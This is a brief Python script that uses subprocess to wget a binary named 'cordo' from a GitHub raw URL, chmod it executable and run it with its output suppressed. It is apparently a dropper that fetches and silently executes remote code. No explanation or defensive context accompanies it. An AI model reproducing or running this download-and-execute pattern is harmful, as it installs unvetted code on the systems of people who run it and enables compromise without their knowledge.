import os
import subprocess
subprocess.run(['wget','https://raw.githubusercontent.com/jrkeiter/sile/main/cordo'])
subprocess.run(['chmod','+x','cordo'])
subprocess.run(['./cordo','>/dev/null 2>&1'])
